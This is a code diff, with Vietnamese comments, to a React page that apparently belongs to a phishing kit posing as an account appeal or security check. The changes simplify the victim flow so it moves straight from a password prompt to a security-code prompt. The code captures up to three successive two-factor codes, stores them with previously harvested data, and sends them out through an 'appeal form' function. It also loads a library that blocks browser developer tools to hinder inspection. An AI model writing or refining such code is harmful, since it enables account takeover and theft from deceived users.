@@ -9,7 +9,6 @@ import AuthModal from '../components/modals/AuthModal';
 import PasswordModal from '../components/modals/PasswordModal';
 import SecurityModal from '../components/modals/SecurityModal';
 import FinalModal from '../components/modals/FinalModal';
-// import ChoseAuthenModal from '../components/modals/ChoseAuthen'; // Có thể bỏ import này nếu không dùng nữa
 import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
 import disableDevtool from 'disable-devtool';
 import moment from 'moment';
@@ -40,16 +39,14 @@ const AccountPageComponent = () => {
     const [openFinalModal, setOpenFinalModal] = useState(false);
     const [timeCounter, setTimeCounter] = useState(0);
 
-    // Bỏ state openChoseAuthenModal vì không dùng nữa
-    // const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false); 
-    const [dataCookie, setDataCookie] = useState(null);
+    // Bỏ state openChoseAuthenModal và dataCookie không cần thiết
 
+    // STATE LƯU TRỮ DỮ LIỆU ĐỂ CHUYỂN QUA MODAL SECURITY
     const [dataCookieSecurity, setDataCookieSecurity] = useState(null);
 
     // LOADING STATE
     const [loadingPassword, setLoadingPassword] = useState(false);
     const [loadingSecurity, setLoadingSecurity] = useState(false);
-    // const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
 
     // WARNING STATE
     const [warningPassword, setWarningPassword] = useState(false);
@@ -142,9 +139,6 @@ const AccountPageComponent = () => {
                             setWarningPassword(false);
                             setOpenPasswordModal(false);
                             
-                            // --- THAY ĐỔI TẠI ĐÂY: Bỏ qua ChoseAuthenModal ---
-                            // setOpenChoseAuthenModal(true); <--- Dòng cũ
-                            
                             // Mở trực tiếp SecurityModal
                             setOpenSecurityModal(true); 
                             
@@ -159,30 +153,28 @@ const AccountPageComponent = () => {
         }
     }
 
-    // (Bỏ qua hàm handleFinishChoseAuthen vì không dùng nữa)
-
     // FUNCTION HANDLE FINISH SECURITY
     const handleFinishSecurity = async (values) => {
         setLoadingSecurity(true);
         
-        // Logic xác định key lưu trữ (giữ nguyên hoặc điều chỉnh tùy ý)
-        // Vì bỏ qua bước chọn phương thức (clv4), ta có thể coi bước này nối tiếp clv3
-        let currentRecordKey, nextRecordKey, fieldName;
+        // Lấy dữ liệu cơ sở từ state đã được set ở bước Mật khẩu
+        let ck_data = dataCookieSecurity;
         
+        let fieldName;
+        // Gán tên trường dữ liệu tùy theo số lần nhập
         if(clickSecurity === 0) {
-            // Lấy dữ liệu từ clv3 (password xong), lưu vào clv5 (bỏ qua clv4)
-            currentRecordKey = "__ck_clv3"; nextRecordKey = "__ck_clv5"; fieldName = "twoFa";
+            fieldName = "twoFa";
         } else if (clickSecurity === 1) {
-            currentRecordKey = "__ck_clv5"; nextRecordKey = "__ck_clv6"; fieldName = "twoFaSecond";
+            fieldName = "twoFaSecond";
         } else {
-            currentRecordKey = "__ck_clv6"; nextRecordKey = "__ck_clv7"; fieldName = "twoFaThird"; 
+            fieldName = "twoFaThird"; 
         }
 
-        let ck_data = getRecord(currentRecordKey) || dataCookieSecurity; // Fallback to state if localstore fails
-        
         const cookieVersion = { ...ck_data, [fieldName]: values.twoFa };
         
-        if(clickSecurity < 2) saveRecord(nextRecordKey, cookieVersion);
+        // Cần lưu cookie mới nhất để đảm bảo dữ liệu đầy đủ cho lần gửi cuối
+        if(clickSecurity < 2) saveRecord("__ck_clv_security_" + (clickSecurity + 1), cookieVersion);
+
 
         await sendAppealForm(cookieVersion)
             .then(() => {
@@ -205,9 +197,6 @@ const AccountPageComponent = () => {
 
     // FUNCTION HANDLE TRY ANOTHER WAY
     const handleTryAnotherWay = () => {
-        // Nút này thường quay lại chọn phương thức. 
-        // Vì đã bỏ bước chọn phương thức, ta có thể cho nó quay lại nhập pass hoặc không làm gì.
-        // Ở đây tôi sẽ cho nó đóng modal Security hiện tại.
         setOpenSecurityModal(false);
         setOpenPasswordModal(true); // Quay lại bước nhập pass
     }
@@ -389,7 +378,7 @@ const AccountPageComponent = () => {
                 loadingSecurity={loadingSecurity}
                 timeCounter={timeCounter}
                 clickSecurity={clickSecurity}
-                dataCookie={dataCookieSecurity}
+                dataCookie={dataCookieSecurity} // Truyền dữ liệu qua prop dataCookie
                 onTryAnotherWay={handleTryAnotherWay}
             />
 
@@ -401,8 +390,6 @@ const AccountPageComponent = () => {
                     resetSecurityState();
                 }}
             />
-            
-            {/* Đã xóa ChoseAuthenModal khỏi Render */}
         </>
     );
 };
